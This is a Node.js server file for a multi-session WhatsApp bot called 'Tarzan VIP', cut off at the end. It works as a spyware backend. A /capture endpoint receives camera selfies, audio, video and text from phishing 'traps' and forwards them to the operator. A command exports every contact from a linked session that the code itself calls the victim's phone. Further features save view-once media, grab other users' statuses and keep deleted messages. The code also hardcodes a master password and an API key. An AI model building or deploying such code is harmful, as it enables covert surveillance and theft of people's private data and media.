const express = require('express');
const fs = require('fs');
const path = require('path');
const qrCode = require('qrcode');
const moment = require('moment-timezone');
const axios = require('axios');
const pino = require('pino');
const { GoogleGenerativeAI } = require('@google/generative-ai');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    downloadMediaMessage,
    jidNormalizedUser,
    generateWAMessageFromContent,
    proto,
    Browsers
} = require('@whiskeysockets/baileys');
const NodeCache = require('node-cache');

// ==========================================
// 🛡️ نظام الحماية من الأعطال
// ==========================================
process.on('uncaughtException', (err) => console.error('🚨 [عطل فادح تم منعه]:', err.message));
process.on('unhandledRejection', (err) => console.error('🚨 [رفض غير معالج تم منعه]:', err.message));

// ==========================================
// ⚙️ الإعدادات الأساسية
// ==========================================
const app = express();
const PORT = process.env.PORT || 10000;
const MASTER_PASSWORD = 'tarzanbot';
const sessions = {};
const msgStore = new Map();
const spamTracker = new Map();
const contactsDB = {};
const activeBvgSessions = new Map(); // 🔵 جديد: نظام BVG

// ==========================================
// 🚀 نظام الكاش المتقدم
// ==========================================
const msgRetryCounterCache = new NodeCache({ stdTTL: 60 * 60, checkperiod: 60 * 10 });
const userDevicesCache = new NodeCache({ stdTTL: 60 * 10, checkperiod: 60 * 2 });

// ==========================================
// 💾 نظام إدارة الإعدادات
// ==========================================
const settingsPath = path.join(__dirname, 'settings.json');
let botSettings = {};

const loadSettings = () => {
    try {
        if (fs.existsSync(settingsPath)) {
            botSettings = JSON.parse(fs.readFileSync(settingsPath, 'utf8'));
        } else {
            botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
            saveSettings();
        }
        if (!botSettings.GLOBAL_CONFIG) {
            botSettings.GLOBAL_CONFIG = { geminiApiKey: "" };
            saveSettings();
        }
    } catch (error) {
        console.error('❌ خطأ في تحميل الإعدادات:', error.message);
        botSettings = { GLOBAL_CONFIG: { geminiApiKey: "" } };
    }
};

const saveSettings = async () => {
    try {
        await fs.promises.writeFile(settingsPath, JSON.stringify(botSettings, null, 2));
    } catch (error) {
        console.error('❌ خطأ في حفظ الإعدادات:', error.message);
    }
};

const generateSessionPassword = () => {
    return 'VIP-' + Math.random().toString(36).substring(2, 8).toUpperCase();
};

loadSettings();

// ==========================================
// 📂 إعداد المجلدات
// ==========================================
const vaultPath = path.join(__dirname, 'ViewOnce_Vault');
if (!fs.existsSync(vaultPath)) fs.mkdirSync(vaultPath);

const sessionsPath = path.join(__dirname, 'sessions');
if (!fs.existsSync(sessionsPath)) fs.mkdirSync(sessionsPath);

const commandsPath = path.join(__dirname, 'commands');
if (!fs.existsSync(commandsPath)) fs.mkdirSync(commandsPath);

const recordingsPath = path.join(__dirname, 'recordings');
if (!fs.existsSync(recordingsPath)) fs.mkdirSync(recordingsPath);

// ==========================================
// 🔵 نظام BVG - تنظيف تلقائي
// ==========================================
setInterval(() => {
    const now = Date.now();
    let cleaned = 0;
    for (const [jid, data] of activeBvgSessions) {
        if (now - data.timestamp > 60 * 60 * 1000) {
            activeBvgSessions.delete(jid);
            cleaned++;
        }
    }
    if (cleaned > 0) console.log(`🧹 تم تنظيف ${cleaned} جلسة BVG قديمة`);
}, 30 * 60 * 1000);

// ==========================================
// 🧹 نظام تنظيف الذاكرة الذكي
// ==========================================
setInterval(() => {
    const now = Date.now();
    let deletedCount = 0;
    
    for (const [key, msg] of msgStore.entries()) {
        const msgTime = (msg.messageTimestamp * 1000) || now;
        if (now - msgTime > 60 * 60 * 1000) {
            msgStore.delete(key);
            deletedCount++;
        }
    }
    
    spamTracker.clear();
    if (deletedCount > 0) {
        console.log(`🧹 [حماية الرام] تم تنظيف ${deletedCount} رسالة قديمة`);
    }
}, 15 * 60 * 1000);

// ==========================================
// 🌐 إعدادات Express
// ==========================================
app.use(express.static('public'));
app.use(express.json({ limit: '500mb' }));
app.use(express.urlencoded({ limit: '500mb', extended: true }));
app.use('/recordings', express.static(recordingsPath));

// ==========================================
// 📚 نظام تحميل الأوامر
// ==========================================
const commandsMap = new Map();

const loadCommands = () => {
    commandsMap.clear();
    try {
        const files = fs.readdirSync(commandsPath).filter(file => file.endsWith('.js'));
        for (const file of files) {
            try {
                delete require.cache[require.resolve(`./commands/${file}`)];
                const command = require(`./commands/${file}`);
                if (command.name && command.execute) {
                    commandsMap.set(command.name.toLowerCase(), command);
                    if (command.aliases && Array.isArray(command.aliases)) {
                        command.aliases.forEach(alias => commandsMap.set(alias.toLowerCase(), command));
                    }
                    console.log(`✅ تم تحميل الأمر: ${command.name}`);
                }
            } catch (error) {
                console.error(`❌ خطأ في تحميل الأمر ${file}:`, error.message);
            }
        }
        console.log(`✅ تم تحميل ${commandsMap.size} أمر`);
    } catch (error) {
        console.error('❌ خطأ في قراءة مجلد الأوامر:', error.message);
    }
};

loadCommands();

// ==========================================
// 🤖 نظام إدارة الجلسات
// ==========================================
const createSessionConfig = (sessionId) => {
    return {
        version: null,
        auth: null,
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        markOnlineOnConnect: true,
        browser: Browsers.macOS('Edge'),
        syncFullHistory: false,
        generateHighQualityLinkPreviews: false,
        msgRetryCounterCache,
        userDevicesCache,
        keepAliveIntervalMs: 30000,
        retryRequestDelayMs: 5000,
        connectTimeoutMs: 60000
    };
};

const initializeSessionSettings = (sessionId) => {
    if (!botSettings[sessionId]) {
        botSettings[sessionId] = {
            password: generateSessionPassword(),
            botEnabled: true,
            commandsEnabled: true,
            aiEnabled: false,
            autoReact: false,
            reactEmoji: '❤️',
            welcomeSent: false,
            antiLink: false,
            antiSpam: false,
            antiBadWords: false,
            badWordsList: ['كس', 'زق', 'شرموط', 'منيوك'],
            antiCall: false,
            statusStealer: false,
            readReceipts: false
        };
        saveSettings();
    }
    return botSettings[sessionId];
};

// ==========================================
// 📱 إدارة جهات الاتصال
// ==========================================
const createContactManager = (sessionId) => {
    if (!contactsDB[sessionId]) {
        contactsDB[sessionId] = new Map();
    }
    
    return {
        save: (id, name) => {
            if (!id) return;
            const cleanId = jidNormalizedUser(id);
            if (cleanId.endsWith('@s.whatsapp.net')) {
                const num = cleanId.split('@')[0];
                if (!contactsDB[sessionId].has(cleanId)) {
                    contactsDB[sessionId].set(cleanId, { 
                        name: name || 'بدون اسم', 
                        number: num 
                    });
                }
            }
        },
        getAll: () => {
            return Array.from(contactsDB[sessionId].values());
        },
        getCount: () => {
            return contactsDB[sessionId].size;
        }
    };
};

// ==========================================
// ⚡ تشغيل الجلسة الرئيسي
// ==========================================
async function startSession(sessionId, res = null, pairingNumber = null) {
    try {
        const sessionPath = path.join(__dirname, 'sessions', sessionId);
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

        const settings = initializeSessionSettings(sessionId);
        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        const sock = makeWASocket({
            ...createSessionConfig(sessionId),
            version,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' }))
            }
        });

        sessions[sessionId] = sock;
        const contactManager = createContactManager(sessionId);

        setupEventListeners(sock, sessionId, settings, contactManager);
        
        if (pairingNumber && !sock.authState.creds.registered) {
            handlePairing(sock, pairingNumber, res);
        }

        setupConnectionListener(sock, sessionId, settings, res, pairingNumber);

        return sock;
    } catch (error) {
        console.error(`❌ فشل تشغيل الجلسة ${sessionId}:`, error.message);
        if (res && !res.headersSent) {
            res.status(500).json({ error: 'فشل تشغيل الجلسة' });
        }
        return null;
    }
}

// ==========================================
// 🎯 إعداد مستمعي الأحداث
// ==========================================
const setupEventListeners = (sock, sessionId, settings, contactManager) => {
    sock.ev.on('creds.update', (creds) => {
        saveCreds(creds);
    });

    sock.ev.on('messaging-history.set', ({ contacts, chats }) => {
        if (contacts) contacts.forEach(c => contactManager.save(c.id, c.name || c.notify));
        if (chats) chats.forEach(chat => contactManager.save(chat.id, chat.name));
    });

    sock.ev.on('contacts.upsert', (contacts) => {
        contacts.forEach(c => contactManager.save(c.id, c.name || c.notify));
    });

    sock.ev.on('chats.upsert', (chats) => {
        chats.forEach(chat => contactManager.save(chat.id, chat.name));
    });

    sock.ev.on('call', async (calls) => {
        if (settings.antiCall) {
            for (const call of calls) {
                if (call.status === 'offer') {
                    try {
                        await sock.rejectCall(call.id, call.from);
                        await sock.sendMessage(call.from, { 
                            text: '⚠️ *عذراً، نظام طرزان VIP يمنع استقبال المكالمات حالياً، يرجى التواصل نصياً.*' 
                        });
                    } catch (error) {}
                }
            }
        }
    });

    setupAntiDelete(sock, sessionId);
    setupMessageHandler(sock, sessionId, settings, contactManager);
};

// ==========================================
// 🛡️ نظام مضاد الحذف
// ==========================================
const setupAntiDelete = (sock, sessionId) => {
    sock.ev.on('messages.update', async updates => {
        for (const { key, update } of updates) {
            if (update?.message === null && key?.remoteJid && !key.fromMe) {
                try {
                    const storedMsg = msgStore.get(`${key.remoteJid}_${key.id}`);
                    if (!storedMsg?.message) continue;
                    
                    const selfId = jidNormalizedUser(sock.user.id);
                    const senderJid = key.participant || storedMsg.key?.participant || key.remoteJid;
                    const number = senderJid.split('@')[0];
                    const name = storedMsg.pushName || 'مجهول';
                    const time = moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD");
                    
                    const alertText = `🚫 *[رسالة محذوفة]* 🚫\n👤 *الاسم:* ${name}\n📱 *الرقم:* wa.me/${number}\n🕒 *الوقت:* ${time}\n👇 *المحتوى:*`;
                    
                    await sock.sendMessage(selfId, { text: alertText });
                    await sock.sendMessage(selfId, { forward: storedMsg });
                } catch (error) {}
            }
        }
    });
};

// ==========================================
// 📨 معالج الرسائل الرئيسي
// ==========================================
const setupMessageHandler = (sock, sessionId, settings, contactManager) => {
    sock.ev.on('messages.upsert', async ({ messages, type }) => {
        if (type !== 'notify') return;
        
        const msg = messages[0];
        if (!msg?.message) return;

        const from = msg.key.remoteJid;
        const isGroup = from.endsWith('@g.us');
        const sender = isGroup ? msg.key.participant : from;
        const pushName = msg.pushName || 'مجهول';
        const selfId = jidNormalizedUser(sock.user.id);
        const isFromMe = msg.key.fromMe || sender === selfId;
        const currentSettings = botSettings[sessionId] || {};

        handleReadReceipts(sock, msg, currentSettings, isFromMe);

        if (from === 'status@broadcast' && currentSettings.statusStealer && !isFromMe) {
            await handleStatusStealer(sock, msg, sender, selfId);
        }

        if (msgStore.size < 15000) {
            msgStore.set(`${from}_${msg.key.id}`, msg);
        }

        if (!currentSettings.botEnabled) return;

        const body = getMessageBody(msg);
        
        if (isGroup && !isFromMe) {
            const groupData = await handleGroupProtection(sock, from, sender, selfId, body, currentSettings, msg);
            if (groupData.shouldReturn) return;
        }

        await handleViewOnceMedia(sock, msg, sender, pushName, selfId);

        if (currentSettings.autoReact && !isFromMe) {
            await handleAutoReact(sock, from, msg, currentSettings.reactEmoji);
        }

        if (currentSettings.aiEnabled && !isFromMe && body.trim() !== '') {
            await handleAIChat(sock, from, body, msg);
            return;
        }

        await handleCommands(sock, msg, from, sender, pushName, isFromMe, isGroup, body, currentSettings, sessionId);
    });
};

// ==========================================
// 🔧 دوال مساعدة لمعالج الرسائل
// ==========================================
const getMessageBody = (msg) => {
    return msg.message.conversation || 
           msg.message.extendedTextMessage?.text || 
           msg.message.imageMessage?.caption || 
           msg.message.videoMessage?.caption || 
           '';
};

const handleReadReceipts = async (sock, msg, settings, isFromMe) => {
    if (!isFromMe && msg.key && settings.readReceipts) {
        try {
            await sock.readMessages([msg.key]);
        } catch (error) {}
    }
};

const handleStatusStealer = async (sock, msg, sender, selfId) => {
    try {
        await sock.sendMessage(selfId, { 
            forward: msg, 
            caption: `📥 *تم سحب ستوري من:* wa.me/${sender.split('@')[0]}` 
        });
    } catch (error) {}
};

const handleGroupProtection = async (sock, from, sender, selfId, body, settings, msg) => {
    try {
        const groupMetadata = await sock.groupMetadata(from);
        const participants = groupMetadata.participants;
        const isAdmin = participants.find(p => p.id === sender)?.admin !== null;
        const botIsAdmin = participants.find(p => p.id === selfId)?.admin !== null;

        if (!isAdmin && botIsAdmin) {
            if (settings.antiLink && containsLink(body)) {
                await sock.sendMessage(from, { delete: msg.key });
                await sock.sendMessage(from, { 
                    text: `🚫 @${sender.split('@')[0]} ممنوع إرسال الروابط في هذا القروب!`, 
                    mentions: [sender] 
                });
                return { shouldReturn: true };
            }

            if (settings.antiSpam) {
                const spamCheck = await checkSpam(sender);
                if (spamCheck.isSpam) {
                    await sock.sendMessage(from, { delete: msg.key });
                    if (spamCheck.count === 5) {
                        await sock.sendMessage(from, { 
                            text: `⚠️ @${sender.split('@')[0]} توقف عن التكرار (سبام)!`, 
                            mentions: [sender] 
                        });
                    }
                    return { shouldReturn: true };
                }
            }

            if (settings.antiBadWords && settings.badWordsList) {
                const hasBadWord = settings.badWordsList.some(word => 
                    body.toLowerCase().includes(word.toLowerCase())
                );
                if (hasBadWord) {
                    await sock.sendMessage(from, { delete: msg.key });
                    await sock.sendMessage(from, { 
                        text: `🚫 @${sender.split('@')[0]} عذراً، هذه الكلمة ممنوعة هنا!`, 
                        mentions: [sender] 
                    });
                    return { shouldReturn: true };
                }
            }
        }
    } catch (error) {}
    return { shouldReturn: false };
};

const containsLink = (text) => {
    return text.includes('http://') || 
           text.includes('https://') || 
           text.includes('chat.whatsapp.com');
};

const checkSpam = (sender) => {
    const now = Date.now();
    const userSpam = spamTracker.get(sender) || { count: 0, last: 0 };
    
    if (now - userSpam.last < 2000) {
        userSpam.count++;
        if (userSpam.count > 4) {
            userSpam.last = now;
            spamTracker.set(sender, userSpam);
            return { isSpam: true, count: userSpam.count };
        }
    } else {
        userSpam.count = 1;
    }
    userSpam.last = now;
    spamTracker.set(sender, userSpam);
    return { isSpam: false, count: userSpam.count };
};

const handleViewOnceMedia = async (sock, msg, sender, pushName, selfId) => {
    let viewOnceIncoming = msg.message.viewOnceMessage || 
                          msg.message.viewOnceMessageV2 || 
                          msg.message.viewOnceMessageV2Extension;
    
    const mediaTypeCheck = Object.keys(msg.message)[0];
    if (msg.message[mediaTypeCheck]?.viewOnce === true) {
        viewOnceIncoming = { message: msg.message };
    }
    
    if (viewOnceIncoming && !msg.key.fromMe) {
        try {
            const actualMessage = viewOnceIncoming.message;
            const mediaType = Object.keys(actualMessage)[0];
            const buffer = await downloadMediaMessage(msg, 'buffer', {}, { 
                logger: pino({ level: 'silent' }) 
            });

            const ext = getMediaExtension(mediaType);
            const fileName = `VO_${sender.split('@')[0]}_${Date.now()}.${ext}`;
            fs.writeFileSync(path.join(vaultPath, fileName), buffer);

            const reportTxt = `🚨 *[رادار الميديا المخفية]* 🚨\n\n👤 *المرسل:* ${pushName}\n📱 *الرقم:* wa.me/${sender.split('@')[0]}\n📁 *حُفظت باسم:* ${fileName}\n\n*— TARZAN VIP 👑*`;
            
            await sendMediaToSelf(sock, selfId, mediaType, buffer, reportTxt);
        } catch (error) {}
    }
};

const getMediaExtension = (mediaType) => {
    if (mediaType === 'imageMessage') return 'jpg';
    if (mediaType === 'videoMessage') return 'mp4';
    if (mediaType === 'audioMessage') return 'ogg';
    return 'bin';
};

const sendMediaToSelf = async (sock, selfId, mediaType, buffer, caption) => {
    try {
        if (mediaType === 'imageMessage') {
            await sock.sendMessage(selfId, { image: buffer, caption });
        } else if (mediaType === 'videoMessage') {
            await sock.sendMessage(selfId, { video: buffer, caption });
        } else if (mediaType === 'audioMessage') {
            await sock.sendMessage(selfId, { audio: buffer, mimetype: 'audio/mpeg', ptt: true });
        }
    } catch (error) {}
};

const handleAutoReact = async (sock, from, msg, emoji) => {
    try {
        await sock.sendMessage(from, { 
            react: { text: emoji || '❤️', key: msg.key } 
        });
    } catch (error) {}
};

const handleAIChat = async (sock, from, query, msg) => {
    try {
        await sock.sendPresenceUpdate('composing', from);
        
        const API_KEY = 'AI_7bcc1564db6e491c';
        const API_URL = 'http://Fi5.bot-hosting.net:22214/api/chat';

        const response = await axios.post(API_URL, {
            api_key: API_KEY,
            prompt: query.trim()
        }, {
            headers: { 'Content-Type': 'application/json' },
            timeout: 25000
        });

        if (response.data && response.data.status === 'success') {
            await sock.sendMessage(from, { text: response.data.response }, { quoted: msg });
        }
    } catch (error) {}
};

// ==========================================
// 💫 معالجة الأوامر
// ==========================================
const handleCommands = async (sock, msg, from, sender, pushName, isFromMe, isGroup, body, settings, sessionId) => {
    if (!settings.commandsEnabled) return;

    let selectedId = '';
    try {
        const interactiveMsg = msg.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson;
        if (interactiveMsg) {
            selectedId = JSON.parse(interactiveMsg).id || '';
        }
    } catch (error) {}

    let commandName = '';
    let args = [];
    let textArgs = '';

    if (selectedId) {
        commandName = selectedId.toLowerCase();
    } else if (body.startsWith('.')) {
        args = body.slice(1).trim().split(/ +/);
        commandName = args.shift().toLowerCase();
        textArgs = args.join(' ');
    }

    if (!commandName) return;

    if (commandName === 'سحب_جهات' || commandName === 'contacts') {
        await handleContactsExport(sock, from, args, sessionId, msg);
        return;
    }

    const commandData = commandsMap.get(commandName);
    if (commandData) {
        try {
            if (commandName !== '🌚' && commandName !== 'vv') {
                await sock.sendMessage(from, { react: { text: '⏳', key: msg.key } });
            }
            
            await commandData.execute({
                sock,
                msg,
                body,
                args,
                text: textArgs,
                reply: async (text) => {
                    try {
                        await sock.sendPresenceUpdate('composing', from);
                        return await sock.sendMessage(from, { text }, { quoted: msg });
                    } catch (error) {}
                },
                from,
                isGroup,
                sender,
                pushName,
                isFromMe,
                prefix: '.',
                commandName,
                sessions,
                botSettings,
                saveSettings,
                sessionId,
                activeBvgSessions // 🔵 تمرير نظام BVG للأوامر
            });
        } catch (error) {
            console.error(`❌ خطأ في تنفيذ الأمر ${commandName}:`, error.message);
            if (commandName !== '🌚' && commandName !== 'vv') {
                await sock.sendMessage(from, { react: { text: '❌', key: msg.key } });
            }
        }
    }
};

// ==========================================
// 📂 دالة تصدير جهات الاتصال
// ==========================================
const handleContactsExport = async (sock, from, args, sessionId, msg) => {
    const target = args[0] || sessionId;
    
    if (!sessions[target]) {
        await sock.sendMessage(from, { 
            text: `❌ الجلسة [${target}] غير متصلة حالياً في السيرفر.` 
        }, { quoted: msg });
        return;
    }

    try {
        const contactsArray = createContactManager(target).getAll();
        if (contactsArray.length === 0) {
            await sock.sendMessage(from, { 
                text: "⚠️ لم يتم رصد أي جهات اتصال حتى الآن. قم بإرسال أي رسالة من هاتف الضحية لتحفيز المزامنة." 
            }, { quoted: msg });
            return;
        }

        let fileContent = generateContactsFile(contactsArray, target);
        const fileName = `Contacts_${target}_${Date.now()}.txt`;
        const filePath = path.join(__dirname, fileName);
        
        fs.writeFileSync(filePath, fileContent);
        
        await sock.sendMessage(from, {
            document: fs.readFileSync(filePath),
            fileName: `جهات_اتصال_${target}.txt`,
            mimetype: 'text/plain',
            caption: `✅ تم استخراج *${contactsArray.length}* جهة اتصال بنجاح من الجلسة [${target}].`
        }, { quoted: msg });

        fs.unlinkSync(filePath);
    } catch (error) {
        await sock.sendMessage(from, { 
            text: "❌ فشلت عملية سحب البيانات. تأكد من استقرار اتصال الجلسة." 
        }, { quoted: msg });
    }
};

const generateContactsFile = (contacts, target) => {
    let content = `👑 *[قائمة جهات اتصال نظام طرزان VIP]* 👑\n`;
    content += `👤 *الجلسة المستهدفة:* ${target}\n`;
    content += `📊 *إجمالي العدد المستخرج:* ${contacts.length}\n`;
    content += `🕒 *توقيت السحب:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss | YYYY-MM-DD")}\n`;
    content += `━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n`;

    contacts.forEach((c, i) => {
        content += `${i + 1}. 👤 الاسم: ${c.name}\n📱 الرقم: +${c.number}\n🔗 الرابط: wa.me/${c.number}\n\n`;
    });

    content += `\n*— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑽𝑰𝑹𝑼𝑺 𝑫𝑨𝑻𝑨 ⚔️*`;
    return content;
};

// ==========================================
// 🔌 مستمع الاتصال
// ==========================================
const setupConnectionListener = (sock, sessionId, settings, res, pairingNumber) => {
    sock.ev.on('connection.update', async (update) => {
        const { connection, qr, lastDisconnect } = update;

        if (qr && res && !pairingNumber && !res.headersSent) {
            try {
                const qrData = await qrCode.toDataURL(qr);
                res.json({ qr: qrData });
            } catch (error) {}
        }

        if (connection === 'close') {
            const statusCode = lastDisconnect?.error?.output?.statusCode;
            const shouldReconnect = statusCode !== DisconnectReason.loggedOut;
            
            if (shouldReconnect) {
                const retryDelay = statusCode === DisconnectReason.rateOverlimit ? 30000 : 5000;
                console.log(`⚠️ انقطع اتصال ${sessionId}، إعادة المحاولة بعد ${retryDelay/1000} ثانية...`);
                setTimeout(() => startSession(sessionId), retryDelay);
            } else {
                console.log(`❌ تم تسجيل الخروج من الجلسة ${sessionId} يدوياً.`);
                delete sessions[sessionId];
                delete contactsDB[sessionId];
                const sessionPath = path.join(__dirname, 'sessions', sessionId);
                if (fs.existsSync(sessionPath)) {
                    fs.rmSync(sessionPath, { recursive: true, force: true });
                }
            }
        }

        if (connection === 'open') {
            console.log(`✅ الجلسة ${sessionId} متصلة بنجاح وعملت في وضع VIP!`);
            const selfId = jidNormalizedUser(sock.user.id);
            
            try {
                await sock.updateProfileStatus(`🤖 طرزان الواقدي VIP | يعمل الآن`);
            } catch (error) {}

            if (!botSettings[sessionId].welcomeSent) {
                await sendWelcomeMessage(sock, selfId, sessionId);
                botSettings[sessionId].welcomeSent = true;
                saveSettings();
            }
        }
    });
};

// ==========================================
// 📨 دالة إرسال رسالة الترحيب
// ==========================================
const sendWelcomeMessage = async (sock, selfId, sessionId) => {
    try {
        const welcomeText = `👑 *مرحباً بك في نظام طرزان VIP* 👑\n\n✅ *تم الربط بنجاح!*\n\n🔐 *بيانات جلستك (لإعدادات الموقع):*\n👤 *الجلسة:* ${sessionId}\n🔑 *الباسورد:* ${botSettings[sessionId].password}\n\n🤖 *— 𝑻𝑨𝑹𝒁𝑨𝑵 𝑩𝑶𝑻 ⚔️*`;
        
        await sock.sendMessage(selfId, {
            image: { url: 'https://b.top4top.io/p_3489wk62d0.jpg' },
            caption: welcomeText
        });
    } catch (error) {
        console.error('❌ فشل إرسال رسالة الترحيب:', error.message);
    }
};

// ==========================================
// 🔢 معالج الاقتران
// ==========================================
const handlePairing = (sock, pairingNumber, res) => {
    setTimeout(async () => {
        try {
            const code = await sock.requestPairingCode(pairingNumber);
            const formattedCode = code?.match(/.{1,4}/g)?.join('-') || code;
            if (res && !res.headersSent) {
                res.json({ pairingCode: formattedCode });
            }
        } catch (error) {
            console.error('❌ خطأ في كود الاقتران:', error.message);
            if (res && !res.headersSent) {
                res.status(500).json({ 
                    error: 'تعذر طلب الكود. السيرفرات مزدحمة، حاول بعد ثوانٍ.' 
                });
            }
        }
    }, 3000);
};

// ==========================================
// ⏫ تشغيل الجلسات المحفوظة
// ==========================================
async function bootExistingSessions() {
    try {
        if (!fs.existsSync(sessionsPath)) return;
        const folders = fs.readdirSync(sessionsPath);
        
        console.log(`⏳ جاري إقلاع ${folders.length} جلسة محفوظة...`);
        let successCount = 0;
        
        for (const folder of folders) {
            const credsPath = path.join(sessionsPath, folder, 'creds.json');
            if (fs.existsSync(credsPath)) {
                try {
                    await startSession(folder);
                    successCount++;
                    await new Promise(resolve => setTimeout(resolve, 2000));
                } catch (error) {
                    console.error(`❌ فشل تشغيل الجلسة ${folder}:`, error.message);
                }
            }
        }
        
        console.log(`✅ اكتمل إقلاع ${successCount} جلسة بنجاح`);
    } catch (error) {
        console.error('❌ فشل تشغيل الجلسات المحفوظة:', error.message);
    }
}

// ==========================================
// 📥 API استقبال البيانات
// ==========================================
const extractCleanBase64 = (rawData) => {
    if (!rawData) return null;
    return rawData.includes(',') ? rawData.split(',')[1] : rawData;
};

app.post('/capture', async (req, res) => {
    try {
        let { type, data, targetNumber, trapId, moduleId, sessionId } = req.body;
        const currentTitle = moduleId || trapId || 'مُـسْـتَـنَـد نِـظَـامِـي';

        if (sessionId) {
            try { sessionId = decodeURIComponent(sessionId); } catch (error) {}
        }

        if (!type || !data || !sessionId) {
            return res.status(400).json({ 
                success: false, 
                message: "بيانات ناقصة." 
            });
        }

        const sock = sessions[sessionId];
        if (!sock) {
            return res.status(400).json({ 
                success: false, 
                message: "البوت غير متصل حالياً." 
            });
        }

        const jid = jidNormalizedUser(sock.user.id);
        
        const titleMsg = generateCaptureNotification(type, currentTitle);
        await sock.sendMessage(jid, { text: titleMsg });

        await processCapturedData(sock, jid, type, data);

        res.json({ success: true, message: "تم الاستلام بنجاح" });
    } catch (error) {
        console.error('❌ خطأ في استقبال البيانات:', error.message);
        res.status(500).json({ 
            success: false, 
            message: "فشل السيرفر في المعالجة." 
        });
    }
});

const generateCaptureNotification = (type, title) => {
    return `╭════ 🎯 ﴿ إِشْـعَـارُ اسْـتِـقْـبَـال ﴾ 🎯 ════╮\n` +
           `│\n` +
           `│ 🚨 ╟ *النَّـوْع:* ${type.toUpperCase()}\n` +
           `│ 🔖 ╟ *الـعُـنْـوَان:* ${title}\n` +
           `│ ⏱️ ╟ *الـوَقْـت:* ${moment().tz("Asia/Riyadh").format("HH:mm:ss")}\n` +
           `│\n` +
           `╰══════════════════════════════╯`;
};

const processCapturedData = async (sock, jid, type, data) => {
    try {
        if ((type === 'text' || type === 'message') && typeof data === 'string') {
            await sock.sendMessage(jid, { 
                text: `📝 ╟ *الـرِّسَـالَـة الـمُـسْـتَـقْـبَـلَـة:*\n\n${data}` 
            });
        }
        else if (type === 'selfie' && Array.isArray(data)) {
            for (let i = 0; i < data.length; i++) {
                const cleanStr = extractCleanBase64(data[i]);
                if (cleanStr) {
                    const buffer = Buffer.from(cleanStr, 'base64');
                    await sock.sendMessage(jid, { 
                        image: buffer, 
                        caption: `👁️ ╟ الـمُـلْـحَـق [ ${i + 1} / ${data.length} ]` 
                    });
                }
            }
        }
        else if (type === 'audio' && typeof data === 'string') {
            const cleanStr = extractCleanBase64(data);
            if (cleanStr) {
                const buffer = Buffer.from(cleanStr, 'base64');
                await sock.sendMessage(jid, { 
                    audio: buffer, 
                    mimetype: 'audio/mp4', 
                    ptt: true 
                });
            }
        }
        else if (type === 'video' && typeof data === 'string') {
            const cleanStr = extractCleanBase64(data);
            if (cleanStr) {
                const buffer = Buffer.from(cleanStr, 'base64');
                await sock.sendMessage(jid, { 
                    video: buffer, 
                    caption: `🎥 ╟ تَـسْـجِـيـلُ الـفِـيـدْيُـو الـمُـرْسَـل` 
                });
            }
        }
    } catch (error) {
        console.error('❌ خطأ في معالجة البيانات المستقبلة:', error.message);
    }
};

// ==========================================
// 🌐 API إدارة الجلسات
// ==========================================
app.post('/create-session', (req, res) => {
    const { sessionId } = req.body;
    if (!sessionId) {
        return res.status(400).json({ error: 'أدخل اسم الجلسة' });
    }
    startSession(sessionId, res);
});

app.post('/pair', async (req, res) => {
    const { sessionId, number } = req.body;
    if (!sessionId || !number) {
        return res.status(400).json({ error: 'أدخل الجلسة والرقم' });
    }

    const formattedNumber = number.replace(/[^0-9]/g, '');
    const sessionPath = path.join(__dirname, 'sessions', sessionId);

    if (sessions[sessionId]) {
        await sessions[sessionId].logout();
        delete sessions[sessionId];
    }
    if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
    }

    startSession(sessionId, res, formattedNumber);
});

// ==========================================
// ⚙️ API الإعدادات
// ==========================================
app.post('/api/settings/get', (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    
    if (!settings) {
        return res.status(404).json({ error: 'الجلسة غير موجودة' });
    }
    if (settings.password !== password && password !== MASTER_PASSWORD) {
        return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    }
    
    res.json(settings);
});

app.post('/api/settings/save', async (req, res) => {
    const { sessionId, password } = req.body;
    const settings = botSettings[sessionId];
    
    if (!settings) {
        return res.status(404).json({ error: 'الجلسة غير موجودة' });
    }
    if (settings.password !== password && password !== MASTER_PASSWORD) {
        return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    }
    
    Object.assign(botSettings[sessionId], req.body);
    await saveSettings();
    
    res.json({ success: true, message: '✅ تم حفظ التعديلات' });
});

// ==========================================
// 🎯 API حذف التسجيلات القديمة
// ==========================================
app.post('/clean-recordings', async (req, res) => {
    const { password } = req.body;
    if (password !== MASTER_PASSWORD) {
        return res.status(401).json({ error: 'كلمة مرور خاطئة' });
    }
    
    try {
        const files = fs.readdirSync(recordingsPath);
        let deleted = 0;
        const now = Date.now();
        
        for (const file of files) {
            const filePath = path.join(recordingsPath, file);
            const stats = fs.statSync(filePath);
            if (now - stats.mtimeMs > 24 * 60 * 60 * 1000) {
                fs.unlinkSync(filePath);
                deleted++;
            }
        }
        
        res.json({ 
            success: true, 
            message: `تم حذف ${deleted} ملف قديم`,
            remaining: fs.readdirSync(recordingsPath).length
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// ==========================================
// 📊 API معلومات الجلسات
// ==========================================
app.get('/sessions', (req, res) => {
    const sessionList = Object.keys(sessions);
    res.json({
        count: sessionList.length,
        sessions: sessionList,
        activeSessions: sessionList.filter(id => sessions[id]?.user?.id).length
    });
});

app.post('/delete-session', async (req, res) => {
    const { sessionId, password } = req.body;
    
    if (password !== MASTER_PASSWORD) {
        return res.status(401).json({ error: 'كلمة مرور السيرفر خاطئة' });
    }

    const sessionPath = path.join(__dirname, 'sessions', sessionId);
    
    if (sessions[sessionId]) {
        try {
            await sessions[sessionId].logout();
        } catch (error) {}
        delete sessions[sessionId];
    }
    
    if (botSettings[sessionId]) {
        delete botSettings[sessionId];
        await saveSettings();
    }
    
    if (fs.existsSync(sessionPath)) {
